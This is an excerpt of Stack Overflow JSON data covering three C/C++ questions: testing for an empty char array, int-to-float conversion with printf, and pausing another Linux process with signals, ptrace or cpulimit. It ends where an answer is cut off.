[{"comments": [{"owner": {"reputation": 41, "user_id": 5517019, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a0e4d224d6ef3a02692d95666198c4a5?s=128&d=identicon&r=PG&f=1", "display_name": "noob", "link": "https://stackoverflow.com/users/5517019/noob"}, "edited": false, "score": 0, "creation_date": 1461773014, "post_id": 36895009, "comment_id": 61354347, "body": "character array -   char message[MAXNAME];"}, {"owner": {"reputation": 1, "user_id": 5927769, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1197e312b0b3fef5f6a4079fd20b2fc8?s=128&d=identicon&r=PG&f=1", "display_name": "0101010", "link": "https://stackoverflow.com/users/5927769/0101010"}, "reply_to_user": {"reputation": 41, "user_id": 5517019, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a0e4d224d6ef3a02692d95666198c4a5?s=128&d=identicon&r=PG&f=1", "display_name": "noob", "link": "https://stackoverflow.com/users/5517019/noob"}, "edited": false, "score": 0, "creation_date": 1461773313, "post_id": 36895009, "comment_id": 61354576, "body": "Okay - so that rules out my original suggestion. Here is an observation:  Your first <code>if</code> statement only executes if the <code>file.data</code> is <code>null</code>. So why are you calling <code>strcpy</code> for the file.data, which we know is null? I have a feeling something weird is happening here. Have you tried:  <code>if (chat_info[queue].message[0] == NULL</code>"}, {"owner": {"reputation": 41, "user_id": 5517019, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a0e4d224d6ef3a02692d95666198c4a5?s=128&d=identicon&r=PG&f=1", "display_name": "noob", "link": "https://stackoverflow.com/users/5517019/noob"}, "edited": false, "score": 0, "creation_date": 1461773670, "post_id": 36895009, "comment_id": 61354853, "body": "if you can see that the if statement was just to print out filedata and check its contents(closing bracket of if statement at the end)"}, {"owner": {"reputation": 1, "user_id": 5927769, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1197e312b0b3fef5f6a4079fd20b2fc8?s=128&d=identicon&r=PG&f=1", "display_name": "0101010", "link": "https://stackoverflow.com/users/5927769/0101010"}, "reply_to_user": {"reputation": 41, "user_id": 5517019, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a0e4d224d6ef3a02692d95666198c4a5?s=128&d=identicon&r=PG&f=1", "display_name": "noob", "link": "https://stackoverflow.com/users/5517019/noob"}, "edited": false, "score": 0, "creation_date": 1461773767, "post_id": 36895009, "comment_id": 61354935, "body": "Okay - I see that now. As an aside, you should always make blocks distinguishable.  Anyway - <code>chat_info[queue].message</code> is not necessarily <code>&#39;\\0&#39;</code> after you use <code>strcpy</code>, since you are copying <code>file.data</code> into <code>chat_info[queue].message</code>. You need to figure out what file.data is if you want to determine what <code>chat_info[queue].message[0]</code> is going to be. As it is now, you are essentially doing nothing with the line: <code>chat_info[queue].message[0] = &#39;\\0&#39;</code>"}], "tags": [], "owner": {"reputation": 1, "user_id": 5927769, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1197e312b0b3fef5f6a4079fd20b2fc8?s=128&d=identicon&r=PG&f=1", "display_name": "0101010", "link": "https://stackoverflow.com/users/5927769/0101010"}, "is_accepted": false, "score": 0, "last_activity_date": 1461772760, "creation_date": 1461772760, "answer_id": 36895009, "question_id": 36894757, "link": "https://stackoverflow.com/questions/36894757/checking-contents-of-char-array-in-c/36895009#36895009", "title": "Checking contents of char array in C", "body": "<p>What is the type for <code>message</code>? Because, if it is a string, then it will implicitly cast when you set it to a char <code>= '\\0';</code>. Perhaps, you need to do:</p>\n\n<p><code>if (chat_info[queue].message[0] == \"\\0\")</code></p>\n"}, {"tags": [], "owner": {"reputation": 19601, "user_id": 1620779, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/dlgGb.png?s=128&g=1", "display_name": "sjsam", "link": "https://stackoverflow.com/users/1620779/sjsam"}, "is_accepted": false, "score": 0, "last_activity_date": 1461773203, "creation_date": 1461773203, "answer_id": 36895204, "question_id": 36894757, "link": "https://stackoverflow.com/questions/36894757/checking-contents-of-char-array-in-c/36895204#36895204", "title": "Checking contents of char array in C", "body": "<pre><code>strcpy(chat_info[queue].message,filedata.data);\n/* You have assigned some data for chat_info[queue].message\n * in the above step assignment should be successful.\n */\n\nif(chat_info[queue].message[0]=='\\0')\n/* How can message[0] be null? It will never be. Think of what you're\n * trying to achieve with the condition.\n * If you're checking for a non-empty message, then it should be\n * chat_info[queue].message[0]!='\\0'\n */\n{\n./* some stuff here */\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 846, "user_id": 3450877, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/VV0PK.png?s=128&g=1", "display_name": "kylemart", "link": "https://stackoverflow.com/users/3450877/kylemart"}, "is_accepted": true, "score": 0, "last_activity_date": 1461774663, "last_edit_date": 1461774663, "creation_date": 1461774109, "answer_id": 36895532, "question_id": 36894757, "link": "https://stackoverflow.com/questions/36894757/checking-contents-of-char-array-in-c/36895532#36895532", "title": "Checking contents of char array in C", "body": "<p>The first issue I see:</p>\n\n<pre><code>if (filedata.data == NULL)\n</code></pre>\n\n<p>Which can also be written as:</p>\n\n<pre><code>if (!filedata.data)\n</code></pre>\n\n<p>Once inside the if-statement you attempt to copy the contents of <code>filedata.data</code> into <code>chat_info[queue].message</code>. However, we previously established that <code>filedata.data</code> points to nothing. It is NULL. Using <code>strcpy()</code> with a NULL pointer as the source should not work. </p>\n\n<p>Perhaps you meant:</p>\n\n<pre><code>if (filedata.data != NULL)\n</code></pre>\n\n<p>Which can also be written as:</p>\n\n<pre><code>if (filedata.data)\n</code></pre>\n\n<p>Secondly, if <code>filedata.data</code> wasn't NULL, think about when <code>chat_info[queue].message[0] == '\\0'</code> would be true.</p>\n\n<pre><code>strcpy(chat_info[queue].message, filedata.data);\nif(chat_info[queue].message[0] == '\\0') {\n   // Message was determined to be empty.\n}\n</code></pre>\n\n<p>It would only be true if the <code>filedata.data</code> was an empty string. <strong>(Note: this is different than being NULL!)</strong> Is that what you want? If so, the current code should work fine.</p>\n\n<p>Reference: <a href=\"http://man7.org/linux/man-pages/man3/strncpy.3.html\" rel=\"nofollow\">strcpy() documentation</a></p>\n"}], "owner": {"reputation": 41, "user_id": 5517019, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a0e4d224d6ef3a02692d95666198c4a5?s=128&d=identicon&r=PG&f=1", "display_name": "noob", "link": "https://stackoverflow.com/users/5517019/noob"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 347, "favorite_count": 0, "accepted_answer_id": 36895532, "answer_count": 3, "score": -1, "last_activity_date": 1461774663, "creation_date": 1461772111, "last_edit_date": 1461772604, "question_id": 36894757, "link": "https://stackoverflow.com/questions/36894757/checking-contents-of-char-array-in-c", "title": "Checking contents of char array in C", "body": "<p>I have the following structure and have some code to use it below. The control is not going into the <code>if</code> statement(I need to check if the <code>chat_info[queue].message</code> is empty which it is)</p>\n\n<pre><code>struct chat{\n    char message[MAXNAME];\n    int client;\n    int group;\n    int flag;\n};\n.\n.\n.\n.\n\nif(filedata.data==NULL)\n        {\n        printf(\"\\n  data is %s\",filedata.data);} //displays \"data is \"\n        chat_info[queue].message[0]='\\0'; //setting 0 before copying data\n        strcpy(chat_info[queue].message,filedata.data);\n        printf(\"\\n  data is %s\",chat_info[queue].message);//displays \"data is \"\n        if(chat_info[queue].message[0]=='\\0'){\n   // not going into this if statement\n   //I also tried if(chat_info[queue].message== \"\") and if(chat_info[queue].message== NULL)\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 2, "creation_date": 1461772033, "post_id": 36894650, "comment_id": 61353562, "body": "Where do you convert your <code>int</code> to a <code>float</code>? Printing an <code>int</code> with a format for floats isn&#39;t conversion, it&#39;s undefined behaviour. (And <code>n</code> isn&#39;t initialised when you use it for the first time.)"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 2, "creation_date": 1461772038, "post_id": 36894650, "comment_id": 61353568, "body": "<code>printf(&quot;\\nYour float is: %.5f&quot;, n);</code> --&gt; <code>printf(&quot;\\nYour float is: %.5f&quot;, (double) n);</code>"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1461772050, "post_id": 36894650, "comment_id": 61353576, "body": "There is no conversion done, merely UB from an incorrect specifier."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 4, "creation_date": 1461772109, "post_id": 36894650, "comment_id": 61353614, "body": "Just treating a bike like a plane doesn&#39;t make it fly."}], "answers": [{"comments": [{"owner": {"reputation": 525, "user_id": 2747961, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/2f020f3f1b168067b0b1c06fb1094081?s=128&d=identicon&r=PG&f=1", "display_name": "ddz", "link": "https://stackoverflow.com/users/2747961/ddz"}, "edited": false, "score": 0, "creation_date": 1461772640, "post_id": 36894761, "comment_id": 61354056, "body": "Why not? I know it was &quot;wrong&quot; since <code>n</code> was unitialized and I&#39;ve already changed that printf, but even with <code>-Wall</code> and <code>-Wextra</code> GCC gives me no warning. &quot;Wrong&quot; because it would just print garbage."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1461772723, "post_id": 36894761, "comment_id": 61354115, "body": "You could have tried <code>-O1</code> or even more optimisation. I did not downvote, BTW."}, {"owner": {"reputation": 525, "user_id": 2747961, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/2f020f3f1b168067b0b1c06fb1094081?s=128&d=identicon&r=PG&f=1", "display_name": "ddz", "link": "https://stackoverflow.com/users/2747961/ddz"}, "reply_to_user": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1461772899, "post_id": 36894761, "comment_id": 61354260, "body": "Only if I combine <code>-O1</code> with <code>-Wall</code>. But I don&#39;t think anyone would put <code>-O1</code> in a code like this. Also, you are provoking GCC to give a warning. Obviously, I was talking about passing an integer to printf while it expected a double."}], "tags": [], "owner": {"reputation": 525, "user_id": 2747961, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/2f020f3f1b168067b0b1c06fb1094081?s=128&d=identicon&r=PG&f=1", "display_name": "ddz", "link": "https://stackoverflow.com/users/2747961/ddz"}, "is_accepted": false, "score": 2, "last_activity_date": 1461772550, "last_edit_date": 1461772550, "creation_date": 1461772117, "answer_id": 36894761, "question_id": 36894650, "link": "https://stackoverflow.com/questions/36894650/c-program-wrote-code-to-convert-int-to-float-but-its-giving-me-0-0000-and-it/36894761#36894761", "title": "C program: Wrote code to convert int to float, but it&#39;s giving me 0.0000 and it&#39;s changing my input to some strange number", "body": "<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int n;\n    printf(\"\\nPlease input an integer to convert to float: \");\n    scanf(\"%d\", &amp;n);\n    printf(\"\\nYour float is: %.5f\", (float)n);\n\n    return(0);\n}\n</code></pre>\n\n<p>You have to explicitly write the cast, if you want an integer to be converted to a float in that way. If you don't, this causes undefined behavior. Another way is to declare a float variable and assign n to it.</p>\n\n<p>By the way, the code you wrote shouldn't even compile without a warning on GCC.</p>\n"}], "owner": {"reputation": 11, "user_id": 5692407, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8f1e4db80cb8f1afa355585338170f89?s=128&d=identicon&r=PG&f=1", "display_name": "neuravinci", "link": "https://stackoverflow.com/users/5692407/neuravinci"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 844, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1461772681, "creation_date": 1461771806, "last_edit_date": 1461772681, "question_id": 36894650, "link": "https://stackoverflow.com/questions/36894650/c-program-wrote-code-to-convert-int-to-float-but-its-giving-me-0-0000-and-it", "title": "C program: Wrote code to convert int to float, but it&#39;s giving me 0.0000 and it&#39;s changing my input to some strange number", "body": "<p>I have the following piece of code, also available at <a href=\"https://ideone.com/FAJrm3\" rel=\"nofollow\">this link</a>.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main()\n{\n    int n;\n    printf(\"\\nPlease input an integer to convert to float: %d\", n );\n    scanf(\"%d\", &amp;n);\n    printf(\"\\nYour float is: %.5f\", n);\n\n    return(0);\n\n}\n</code></pre>\n\n<p>What it's doing is not converting the float, it only gives me 0.0000, and it also takes my input and makes it some wacky number.\nI'm not sure what I'm doing wrong, even after looking around on different sites. \nI can't use any library, either, so nothing of atol, etc</p>\n"}, {"tags": ["c++", "c", "multithreading", "performance", "gcc"], "comments": [{"owner": {"reputation": 842, "user_id": 3431018, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/ec7e7c6e6ed3cbe22d7f6179fe8870e9?s=128&d=identicon&r=PG", "display_name": "rafaelcpalmeida", "link": "https://stackoverflow.com/users/3431018/rafaelcpalmeida"}, "edited": false, "score": 0, "creation_date": 1461771647, "post_id": 36894504, "comment_id": 61353255, "body": "I believe that you can only send signals between processes if they have any kind of relation (i.e father / child). Only the kernel has the ability to send a signal to any process he desires."}, {"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "edited": false, "score": 0, "creation_date": 1461771762, "post_id": 36894504, "comment_id": 61353356, "body": "You&#39;re looking for Inter Process Communication: <a href=\"http://beej.us/guide/bgipc/\" rel=\"nofollow noreferrer\">beej.us/guide/bgipc</a>"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 842, "user_id": 3431018, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/ec7e7c6e6ed3cbe22d7f6179fe8870e9?s=128&d=identicon&r=PG", "display_name": "rafaelcpalmeida", "link": "https://stackoverflow.com/users/3431018/rafaelcpalmeida"}, "edited": false, "score": 1, "creation_date": 1461771764, "post_id": 36894504, "comment_id": 61353357, "body": "@rafaelcpalmeida That&#39;s not true. You can send a signal to any process."}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "reply_to_user": {"reputation": 842, "user_id": 3431018, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/ec7e7c6e6ed3cbe22d7f6179fe8870e9?s=128&d=identicon&r=PG", "display_name": "rafaelcpalmeida", "link": "https://stackoverflow.com/users/3431018/rafaelcpalmeida"}, "edited": false, "score": 1, "creation_date": 1461771780, "post_id": 36894504, "comment_id": 61353379, "body": "@rafaelcpalmeida, of course not. You are able to send signals to any process as long as you have perimissions - i.e. is the same user which runs the process or is root."}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1461771796, "post_id": 36894504, "comment_id": 61353392, "body": "@Barmar, not to <b>any</b> process."}, {"owner": {"reputation": 842, "user_id": 3431018, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/ec7e7c6e6ed3cbe22d7f6179fe8870e9?s=128&d=identicon&r=PG", "display_name": "rafaelcpalmeida", "link": "https://stackoverflow.com/users/3431018/rafaelcpalmeida"}, "reply_to_user": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1461771870, "post_id": 36894504, "comment_id": 61353450, "body": "@SergeyA my process can send a signal to another process or I (user) can send a signal to another process?"}, {"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "reply_to_user": {"reputation": 842, "user_id": 3431018, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/ec7e7c6e6ed3cbe22d7f6179fe8870e9?s=128&d=identicon&r=PG", "display_name": "rafaelcpalmeida", "link": "https://stackoverflow.com/users/3431018/rafaelcpalmeida"}, "edited": false, "score": 0, "creation_date": 1461771907, "post_id": 36894504, "comment_id": 61353476, "body": "@rafaelcpalmeida Yes, definitely! Look at the link I posted in my comment above ;)"}, {"owner": {"reputation": 842, "user_id": 3431018, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/ec7e7c6e6ed3cbe22d7f6179fe8870e9?s=128&d=identicon&r=PG", "display_name": "rafaelcpalmeida", "link": "https://stackoverflow.com/users/3431018/rafaelcpalmeida"}, "edited": false, "score": 0, "creation_date": 1461772261, "post_id": 36894504, "comment_id": 61353738, "body": "Thanks guys, I thought my process could only send signals to his child processes"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1461772358, "post_id": 36894504, "comment_id": 61353808, "body": "The first two paragraphs describe an extremely unlikely OS design.  &#39;Programs&#39; do not run on cores, threads do."}, {"owner": {"reputation": 1529, "user_id": 2191202, "user_type": "registered", "accept_rate": 28, "profile_image": "https://www.gravatar.com/avatar/6b276e74b1bc731105d163bbb79906c0?s=128&d=identicon&r=PG", "display_name": "bholanath", "link": "https://stackoverflow.com/users/2191202/bholanath"}, "reply_to_user": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "edited": false, "score": 0, "creation_date": 1461772415, "post_id": 36894504, "comment_id": 61353852, "body": "@terencehill, thanks for commenting and the link you provided. I am just wondering how program2 will react once it get signal/interrupt from program1. Considering both case when Program2 is not under our control and when it is in our control( we can write signal handler code)."}, {"owner": {"reputation": 21464, "user_id": 257645, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/SE5gW.jpg?s=128&g=1", "display_name": "kfsone", "link": "https://stackoverflow.com/users/257645/kfsone"}, "edited": false, "score": 0, "creation_date": 1461778856, "post_id": 36894504, "comment_id": 61358342, "body": "@bholanath Nobody can answer your question because as far as we know program2 is some kind of black box. It&#39;s up to YOU to find out about program2 and what mechanisms it <i>provides</i> for IPC. Maybe it listens on sockets, maybe it has support for SysV IPC of some form, or maybe it has custom signal handlers for, say, SIGUSR1. Since you say you can&#39;t change program2, we can only propose possible mechanisms but we&#39;re wasting our time if program2 doesn&#39;t support them."}, {"owner": {"reputation": 1529, "user_id": 2191202, "user_type": "registered", "accept_rate": 28, "profile_image": "https://www.gravatar.com/avatar/6b276e74b1bc731105d163bbb79906c0?s=128&d=identicon&r=PG", "display_name": "bholanath", "link": "https://stackoverflow.com/users/2191202/bholanath"}, "reply_to_user": {"reputation": 21464, "user_id": 257645, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/SE5gW.jpg?s=128&g=1", "display_name": "kfsone", "link": "https://stackoverflow.com/users/257645/kfsone"}, "edited": false, "score": 0, "creation_date": 1461780230, "post_id": 36894504, "comment_id": 61359239, "body": "@kfsone, thank you for your comment. I am trying to control a program execution which is not under my control. May be I need to rephrase the question in a way &quot; how to control execution of a independent program which is running in other core&quot; , may be sending signal is not a solution, may be I need to use some other approach to achieve that."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1461782282, "post_id": 36894504, "comment_id": 61360533, "body": "There&#39;s no general purpose way to do that. The program has to provide some way for it to be controlled. If it&#39;s an interactive application that reads input from the terminal, you can use an <code>Expect</code> script to control it."}, {"owner": {"reputation": 1529, "user_id": 2191202, "user_type": "registered", "accept_rate": 28, "profile_image": "https://www.gravatar.com/avatar/6b276e74b1bc731105d163bbb79906c0?s=128&d=identicon&r=PG", "display_name": "bholanath", "link": "https://stackoverflow.com/users/2191202/bholanath"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1461783445, "post_id": 36894504, "comment_id": 61361269, "body": "@Barmar, the other process is running continuously, doing some compute intensive job, so it is not an interactive process which is waiting for some input from terminal. As per Stian&#39;s comment I am looking into ptrace option to control (start/stop) execution of other process."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1461783740, "post_id": 36894504, "comment_id": 61361458, "body": "I&#39;ve updated my answer. If you&#39;re looking into <code>ptrace</code>, then you can try using a debugger as the interface to it."}, {"owner": {"reputation": 21464, "user_id": 257645, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/SE5gW.jpg?s=128&g=1", "display_name": "kfsone", "link": "https://stackoverflow.com/users/257645/kfsone"}, "edited": false, "score": 0, "creation_date": 1461785032, "post_id": 36894504, "comment_id": 61362285, "body": "Are you saying you want to control scheduling of program2? To block it from executing for some period of time before allowing it to resume execution?"}, {"owner": {"reputation": 1529, "user_id": 2191202, "user_type": "registered", "accept_rate": 28, "profile_image": "https://www.gravatar.com/avatar/6b276e74b1bc731105d163bbb79906c0?s=128&d=identicon&r=PG", "display_name": "bholanath", "link": "https://stackoverflow.com/users/2191202/bholanath"}, "reply_to_user": {"reputation": 21464, "user_id": 257645, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/SE5gW.jpg?s=128&g=1", "display_name": "kfsone", "link": "https://stackoverflow.com/users/257645/kfsone"}, "edited": false, "score": 0, "creation_date": 1461786701, "post_id": 36894504, "comment_id": 61363316, "body": "@kfsone, you are right. Exactly I am trying to block it for some period of time before allowing it to resume its execution and also allow for very small amount of time so that it can use very little cpu."}], "answers": [{"comments": [{"owner": {"reputation": 1529, "user_id": 2191202, "user_type": "registered", "accept_rate": 28, "profile_image": "https://www.gravatar.com/avatar/6b276e74b1bc731105d163bbb79906c0?s=128&d=identicon&r=PG", "display_name": "bholanath", "link": "https://stackoverflow.com/users/2191202/bholanath"}, "edited": false, "score": 0, "creation_date": 1461772267, "post_id": 36894707, "comment_id": 61353746, "body": "I need to control execution of other program. How other process will react when it receives interrupt due to kill command ?"}, {"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "edited": false, "score": 0, "creation_date": 1461772330, "post_id": 36894707, "comment_id": 61353790, "body": "... and one of the <code>exec</code> family to execute a process (<a href=\"http://www.gnu.org/software/libc/manual/html_node/Executing-a-File.html#Executing-a-File\" rel=\"nofollow noreferrer\">link</a>)"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 1529, "user_id": 2191202, "user_type": "registered", "accept_rate": 28, "profile_image": "https://www.gravatar.com/avatar/6b276e74b1bc731105d163bbb79906c0?s=128&d=identicon&r=PG", "display_name": "bholanath", "link": "https://stackoverflow.com/users/2191202/bholanath"}, "edited": false, "score": 0, "creation_date": 1461772429, "post_id": 36894707, "comment_id": 61353867, "body": "@bholanath Use <code>sigaction</code> in the receiver to establish a signal handler function."}, {"owner": {"reputation": 1529, "user_id": 2191202, "user_type": "registered", "accept_rate": 28, "profile_image": "https://www.gravatar.com/avatar/6b276e74b1bc731105d163bbb79906c0?s=128&d=identicon&r=PG", "display_name": "bholanath", "link": "https://stackoverflow.com/users/2191202/bholanath"}, "edited": false, "score": 0, "creation_date": 1461784494, "post_id": 36894707, "comment_id": 61361923, "body": "@Barmar, I know the pid of running process(cpu intensive process), and in which core it is running, however I don&#39;t have access to what you mentioned as - You&#39;ll need a copy of the program with the symbol table intact for this. Is there any way to stop this process for a few microsec and again allow it to run for few microsec?"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1461784698, "post_id": 36894707, "comment_id": 61362069, "body": "You just want to stop and start it, not actually make it do specific things?"}, {"owner": {"reputation": 1529, "user_id": 2191202, "user_type": "registered", "accept_rate": 28, "profile_image": "https://www.gravatar.com/avatar/6b276e74b1bc731105d163bbb79906c0?s=128&d=identicon&r=PG", "display_name": "bholanath", "link": "https://stackoverflow.com/users/2191202/bholanath"}, "edited": false, "score": 0, "creation_date": 1461784963, "post_id": 36894707, "comment_id": 61362238, "body": "@Barmar, I just want to start and stop the other process whenever I want. Actually I just want to restrict another compute intensive process which is running in other CPU core, whose pid I know, I want to interrupt or preempt or schedule out frequently from CPU run queue so that it can&#39;t use more cpu. One way I am trying to do this by using cpulimit and nice."}, {"owner": {"reputation": 1529, "user_id": 2191202, "user_type": "registered", "accept_rate": 28, "profile_image": "https://www.gravatar.com/avatar/6b276e74b1bc731105d163bbb79906c0?s=128&d=identicon&r=PG", "display_name": "bholanath", "link": "https://stackoverflow.com/users/2191202/bholanath"}, "edited": false, "score": 0, "creation_date": 1461785138, "post_id": 36894707, "comment_id": 61362354, "body": "@Barmar, I have done this in a single cpu when both program1 and program2 are running in same cpu core and program1 allow program2 to run for very small amount of time, before it is preempted by program1."}, {"owner": {"reputation": 1529, "user_id": 2191202, "user_type": "registered", "accept_rate": 28, "profile_image": "https://www.gravatar.com/avatar/6b276e74b1bc731105d163bbb79906c0?s=128&d=identicon&r=PG", "display_name": "bholanath", "link": "https://stackoverflow.com/users/2191202/bholanath"}, "edited": false, "score": 0, "creation_date": 1461785357, "post_id": 36894707, "comment_id": 61362495, "body": "@Barmar, I will just try your code using kill -STOP &lt;pid&gt; and kill -CONT &lt;pid&gt; and let you know whether it is working or not."}], "tags": [], "owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "is_accepted": false, "score": 3, "last_activity_date": 1461784743, "last_edit_date": 1461784743, "creation_date": 1461771953, "answer_id": 36894707, "question_id": 36894504, "link": "https://stackoverflow.com/questions/36894504/sending-interrupt-signal-to-other-independent-process-in-c-c-in-linux/36894707#36894707", "title": "Sending interrupt signal to other independent process in C/C++ in linux", "body": "<p>You could attach a debugger like <code>gdb</code> to the running 